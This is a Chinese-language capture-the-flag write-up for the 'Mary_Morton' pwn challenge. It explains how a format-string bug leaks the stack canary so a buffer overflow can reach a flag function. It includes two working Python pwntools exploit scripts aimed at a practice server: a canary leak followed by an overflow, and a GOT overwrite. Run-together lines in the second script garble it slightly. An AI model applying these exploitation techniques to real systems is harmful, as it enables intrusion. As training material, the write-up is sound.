## XMan pwn Mary_Morton 格式化字符串泄露/canary/栈溢出

### 从格式化字符串泄露canary到栈溢出

**格式化字符串泄露学习：https://www.cnblogs.com/ichunqiu/p/9329387.html**


以ASIS-CTF-Finals-2017 Mary_Morton为例

checksec查看，开了NX保护，还有canary

![img](http://www.pianshen.com/images/492/ffc43615723233dff7dcfa50deb3aadc.png)

IDA打开

```cpp
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){  const char *v3; // rdi  int v4; // [rsp+24h] [rbp-Ch]  
unsigned __int64 v5; // [rsp+28h] [rbp-8h]   
v5 = __readfsqword(0x28u);  
sub_4009FF();  
puts("Welcome to the battle ! ");  
puts("[Great Fairy] level pwned ");  
v3 = "Select your weapon ";  
puts("Select your weapon ");  
while ( 1 )  {    
	while ( 1 ){      
		sub_4009DA(v3);     
    	v3 = "%d";      
    	__isoc99_scanf("%d", &v4);     
    		if ( v4 != 2 )       
    			break;     
    	sub_4008EB();   
    }   
    if ( v4 == 3 )
    {      
    	puts("Bye ");     
    	exit(0);  
    }    
    if ( v4 == 1 )
    {    
    	sub_400960();    
    }else
    {    
    	v3 = "Wrong!";      
    	puts("Wrong!");   
    }  
  }
} 
    
int sub_4009DA(){  
    puts("1. Stack Bufferoverflow Bug ");  
    puts("2. Format String Bug "); 
    return puts("3. Exit the battle ");
}
```

发现输入2 进入的函数中有格式化字符串洞

```cpp
unsigned __int64 sub_4008EB(){  
    char buf; // [rsp+0h] [rbp-90h]  
    unsigned __int64 v2; // [rsp+88h] [rbp-8h]   
    v2 = __readfsqword(0x28u);  
    memset(&buf, 0, 0x80uLL);  
    read(0, &buf, 0x7FuLL);  
    printf(&buf, &buf);  
    return __readfsqword(0x28u) ^ v2;
}
```

 

输入1 进入的函数中有栈溢出漏洞

```cpp
unsigned __int64 sub_400960(){  
    char buf; // [rsp+0h] [rbp-90h]  
    unsigned __int64 v2; // [rsp+88h] [rbp-8h]   
    v2 = __readfsqword(0x28u);  
    memset(&buf, 0, 0x80uLL);  
    read(0, &buf, 0x100uLL);  
    printf("-> %s\n", &buf);  
    return __readfsqword(0x28u) ^ v2;
}
```

 不能直接覆盖溢出，因为有canary在会比较函数执行前后一不一样，不一样就会崩，所以需要泄露canary填回去。

**这个题有两种做法**

**方法一:通过格式化字符串漏洞泄露canary,然后利用栈溢出漏洞执行cat flag函数**

canary在入栈后，会清空eax中的数据

​           ![img](http://www.pianshen.com/images/176/7ee529dbcc9f60077493a562aad939a0.png)

​            而在一个函数执行完之后，canary的值会被再取出来，和现在的canary的值比较

​            ![img](http://www.pianshen.com/images/380/d59e32e2f005cc15319857b18c44d084.png)

​        

#### print函数格式化字符串漏洞

1. 当我们输入printf可识别的格式化字符串时，printf会将其作为格式化字符串进行解析并输出。原理很简单，形如printf(“%s”,“Hello world”)的使用形式会把第一个参数%s作为格式化字符串参数进行解析，在这里由于我们直接用printf输出一个变量，当变量也正好是格式化字符串时，自然就会被printf解析
2. 格式化字符串里有%s，用于输出字符。其本质上是读取对应的参数，并作为指针解析，获取到对应地址的字符串输出。由于此时我们可以通过输入来操控栈，我们可以输入一个地址，再让%s正好对应到这个地址，从而输出地址指向的字符串，实现任意地址读。

3. 64位程序，64位的传参顺序是rdi, rsi, rdx, rcx, r8, r9，接下来才是栈，栈上的参数对printf函数来说首先就有6个参数的偏移量

确定canary和输入的参数参数之间的偏移

(1).由IDA中可看出，canary与buf之间距离0x88(136)个字节，因为是64位，以8 个字节为一个        单位，136/8=17，那么canary距离格式化字符串函数23（17+6）个参数的距离

char buf; // [rsp+0h] [rbp-90h]

  unsigned __int64 v2; // [rsp+88h] [rbp-8h]

 (2)也可以用GDB来查看

​    ![img](http://www.pianshen.com/images/153/c238a9d49466766204f0a377a93728f1.png)

   查看栈中内容，计算canary和输入数据的偏移7FFFFFFFE058-7fffffffdfd0=0x88

​    ![img](http://www.pianshen.com/images/240/6328abb96ff853f01f67db4e0fed8160.png)

**编写exp**

```python
from pwn import*
from time import*
io=remote('111.198.29.45','53689')
system_addr=p64(0x4008de)
io.sendlineafter('3. Exit the battle \n','2')
#io.recv()
io.sendline('%23$p')
io.recvuntil('0x')
ss=io.recv(16)
pp=int(ss,16)
pp=p64(pp)
io.sendlineafter('3. Exit the battle \n','1')
p='a'*17*8+pp+'a'*8+system_addr
io.sendline(p)
print io.recv()
print io.recv()
```

![img](http://www.pianshen.com/images/651/d3761345952b45e121425432a4f7f923.png)

**方法二：通过格式化字符串洞覆盖函数地址，执行 catflag函数**

确定可控输入时格式化字符串的第6个参数

![img](http://www.pianshen.com/images/851/c323cf81ffbfa3436b6946abe158912b.png)

使用python第三方库formatStringExploiter  更多详细信息：https://formatstringexploiter.readthedocs.io/en/latest/formatStringExploiter.html

![img](http://www.pianshen.com/images/308/583717b2332491c0b108bcd91acad25c.png)

先定义connect函数用来连接程序，定义exec_fmt实现payload的发送

 **编写利用exp**

```python
from pwn import *
from time import sleep
from formatStringExploiter.FormatString import FormatString 
elf = ELF('./mary_morton')
flag_addr = 0x04008DA
print_addr = elf.got['printf'] 
def connect():    
    global sh   
    sh = remote('111.198.29.45',30559)   
    sh.recvuntil('battle \n')
def exec_fmt(s):    
    sh.sendline('2')    
    sleep(0.1)    
    sh.sendline(s)    
    ret = sh.recvuntil('1. Stack Bufferoverflow', drop=True)    
    sh.recvuntil('battle \n')    
    return ret connect()payload = FormatString(exec_fmt,elf=elf,index=6,pad=0,explore_stack=False)
payload.write_q(print_addr,flag_addr)
sh.sendline("1")
sh.sendline("1")
sh.interactive()
```

![img](http://www.pianshen.com/images/388/0c59e9095c29cdbb0ee855596f289fdc.png)

推荐阅读：[https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/](https://veritas501.space/2017/04/28/论canary的几种玩法/)



